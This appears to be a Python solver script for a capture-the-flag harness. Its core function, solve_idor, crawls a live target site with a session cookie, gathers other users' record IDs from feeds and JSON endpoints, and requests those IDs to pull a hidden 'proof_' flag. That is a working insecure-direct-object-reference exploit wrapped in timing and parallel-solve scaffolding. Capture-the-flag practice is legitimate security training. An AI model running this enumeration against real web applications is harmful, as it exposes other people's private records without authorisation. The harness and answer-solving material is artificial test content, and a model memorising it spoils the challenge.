#!/usr/bin/env python3
"""Solver for this challenge -- harness skeleton. Fill in `answer()`; keep the I/O contract unchanged.

    solve.py --contract <contract.json> --artifacts <dir>   ->  prints {answer_id: value} as JSON on the last line

Runs on the Homebase VM inside a ~6-7 s window for EVERY Mastery set: stdlib + lib.* + pyzipper/pyelftools/pefile/
capstone/pycryptodome/androguard only, no subprocess to 7z/jadx/etc., all sets well under 1 s. Mastery questions name
their files like 'delivery 2: sample_02.apk' or 'evidence.zip -> member': `artifact_bytes()` resolves both (by sha256
pairing first, so same-named per-set deliveries never get mixed up)."""
import argparse
import json
import http.cookiejar
import os
import re
import urllib.error
import urllib.parse
import urllib.request
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parents[4]
sys.path.insert(0, str(ROOT))
from lib.common import (container_by_sha, delivery_missing, find_artifact, group_by_set, load_contract,  # noqa: E402
                        normalize)

_cache = {}


def artifact_bytes(root, contract, artifact):
    """Bytes for a question's `artifact` string (cached per artifact)."""
    if artifact in _cache:
        return _cache[artifact]
    container, _, member = (x.strip() for x in artifact.partition("->"))
    data = None
    p = container_by_sha(root, contract, container)
    if p is not None and not member:
        data = p.read_bytes()
    elif not delivery_missing(root, contract, container):
        for cand in (artifact, container.split(": ", 1)[-1] + (f" -> {member}" if member else "")):
            try:
                data = find_artifact(root, cand)
                break
            except FileNotFoundError:
                continue
    _cache[artifact] = data
    return data


ARTS = None
PROOF_RE = re.compile(r"\bproof[_-][A-Za-z0-9_-]{6,}")
LINK_RE = re.compile(r"""(?:href|src)=["']([^"'#]+)["']""")
FETCH_RE = re.compile(r"""fetch\(\s*["'`]([^"'`]+)["'`]""")


def target_url(question, contract):
    """Base URL of the question's live target, read from the contract's `targets` (matched by the artifact name)."""
    art = (question.get("artifact") or "").strip().lower()
    tg = list(contract.get("targets") or [])
    if ARTS and not tg:   # the harness drops the start/status body (with `targets`) into the artifacts dir
        for p in sorted(Path(ARTS).rglob("*.json")):
            try:
                j = json.loads(p.read_text())
            except (OSError, ValueError):
                continue
            if isinstance(j, dict) and isinstance(j.get("targets"), list):
                tg += [t for t in j["targets"] if isinstance(t, dict)]
    for t in tg:
        if str(t.get("id", "")).strip().lower() == art:
            return t.get("url")
    m = re.search(r"(\d+)\s*$", art)
    for t in tg:
        if m and re.search(r"(\d+)\s*$", str(t.get("id", ""))) and \
                re.search(r"(\d+)\s*$", str(t["id"])).group(1) == m.group(1):
            return t.get("url")
    return tg[0].get("url") if len(tg) == 1 else None


class Site:
    def __init__(self, base):
        self.base = base if base.endswith("/") else base + "/"
        self.op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))
        self.seen = {}

    def get(self, path):
        url = urllib.parse.urljoin(self.base, path)
        if urllib.parse.urlsplit(url).netloc != urllib.parse.urlsplit(self.base).netloc:
            return None
        if url in self.seen:
            return self.seen[url]
        try:
            with self.op.open(urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"}), timeout=8) as r:
                body = r.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", "replace")
        except Exception:  # noqa: BLE001
            body = None
        self.seen[url] = body
        return body


def _ids(obj, out, owner_key=None):
    """Every (id, owner) pair in a JSON value: integer-ish values under keys named id / *_id."""
    if isinstance(obj, dict):
        owner = next((obj[k] for k in obj if k.lower() in ("owner", "user", "username", "owner_name")), None)
        for k, v in obj.items():
            if (k.lower() == "id" or k.lower().endswith("_id") or k.lower().endswith("id")) and \
                    isinstance(v, (int, str)) and str(v).isdigit():
                out.append((str(v), owner))
            else:
                _ids(v, out)
    elif isinstance(obj, list):
        for v in obj:
            _ids(v, out)


def solve_idor(base):
    s = Site(base)
    home = s.get("") or ""
    hits = PROOF_RE.findall(home)
    if hits:
        return hits[0]
    me = None
    m = re.search(r"Signed in as\s+([^<]+)<", home)
    if m:
        me = m.group(1).strip()
    links = [l for l in LINK_RE.findall(home) if not l.startswith(("http", "//", "mailto:")) and "/assets/" not in l]
    templates, ids, pages = [], [], []
    for l in links:
        if re.search(r"/\d+/?$", l):
            pages.append(l)
            ids.append((re.search(r"(\d+)/?$", l).group(1), me))
    feeds = [l for l in links if l not in pages and l.strip("/")]
    # the record page tells which JSON endpoint it reads: fetch("/api/x/<id>") -> template
    for p in pages[:1]:
        body = s.get(p) or ""
        pid = re.search(r"(\d+)/?$", p).group(1)
        for f in FETCH_RE.findall(body):
            if pid in f:
                templates.append(f.replace(pid, "{id}"))
    if not templates and pages:
        templates.append(re.sub(r"\d+(/?)$", r"{id}\1", pages[0]))
    # feeds (activity/history/search endpoints) leak other users' row ids
    for f in feeds:
        body = s.get(f) or ""
        hits = PROOF_RE.findall(body)
        if hits:
            return hits[0]
        try:
            j = json.loads(body)
        except ValueError:
            continue
        if me is None and isinstance(j, dict):
            me = next((v for k, v in j.items() if k.lower() in ("current_user", "user", "me") and isinstance(v, str)),
                      None)
        _ids(j, ids)
    mine = {i for i, o in ids if o == me}
    foreign = [i for i, o in ids if i not in mine and (o is None or o != me)]
    foreign = list(dict.fromkeys(foreign))
    best = None
    for fid in foreign:
        for t in templates:
            body = s.get(t.replace("{id}", fid)) or ""
            hits = PROOF_RE.findall(body)
            if hits:
                return hits[0]
            try:
                j = json.loads(body)
            except ValueError:
                continue
            if isinstance(j, dict) and best is None:
                best = next((j[k] for k in ("proof", "flag", "note", "secret") if isinstance(j.get(k), str)), None)
    return best


def answer(answer_id, question, data, contract):
    """Return the value for one answer_id from its artifact bytes (None = cannot answer). Derive everything from
    `data`; never hard-code a variant's values."""
    base = target_url(question, contract)
    if base:
        return solve_idor(base)
    return None


def fallback(answer_id, question, data, contract):
    """Called ONLY when answer() found nothing (None or an exception): a cheap generic second try for a variant shape
    the direct parse doesn't know (Time Trial / Mastery mutate the task) -- e.g. the lane lib's name-agnostic decoder
    over `data`, then a match against question["answer_format"]. None = give up on this field only."""
    return None


def _past_deadline():
    """The timed runner's HCTF_SOLVE_DEADLINE (epoch) has passed: print the answers found so far instead."""
    try:
        return time.time() > float(os.environ["HCTF_SOLVE_DEADLINE"])
    except (KeyError, ValueError):
        return False


def _solve_pairs(job):
    """Answer one group of (answer_id, question) pairs -- a whole Mastery set, or the whole contract."""
    root, contract, pairs = job
    out = {}
    for aid, q in pairs:
        data = artifact_bytes(root, contract, q.get("artifact") or "")
        try:
            v = answer(aid, q, data, contract)
        except Exception as e:  # noqa: BLE001 - one bad field must not sink the other answers
            print(f"{aid}: {e!r}", file=sys.stderr)
            v = None
        if v is None and not _past_deadline():   # in-window: never let a fallback search eat the kill margin
            try:
                v = fallback(aid, q, data, contract)
            except Exception as e:  # noqa: BLE001
                print(f"{aid}: fallback {e!r}", file=sys.stderr)
        if v is not None:
            out[aid] = normalize(v, q)
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--contract", required=True)
    ap.add_argument("--artifacts", required=True)
    a = ap.parse_args()
    global ARTS
    ARTS = a.artifacts
    contract, pairs = load_contract(a.contract)
    groups = group_by_set(pairs)
    out = {}
    if len(groups) >= 2 and os.environ.get("HCTF_SOLVER_PARALLEL", "1") != "0":
        # Mastery: every set runs inside ONE clock -- one forked process per set (the Homebase VM has 2 vCPUs; heavy
        # per-set work such as unzipping 31 MB deliveries halves). Same results as the sequential loop.
        import multiprocessing as mp
        from concurrent.futures import ProcessPoolExecutor
        try:
            with ProcessPoolExecutor(max_workers=min(len(groups), os.cpu_count() or 2),
                                     mp_context=mp.get_context("fork")) as ex:
                for part in ex.map(_solve_pairs, [(a.artifacts, contract, g) for g in groups.values()]):
                    out.update(part)
        except Exception as e:  # noqa: BLE001 - never lose a solve to the pool: fall back to sequential
            print(f"parallel sets failed ({e!r}); sequential", file=sys.stderr)
            out = _solve_pairs((a.artifacts, contract, pairs))
    else:
        out = _solve_pairs((a.artifacts, contract, pairs))
    print(json.dumps(out))


if __name__ == "__main__":
    main()
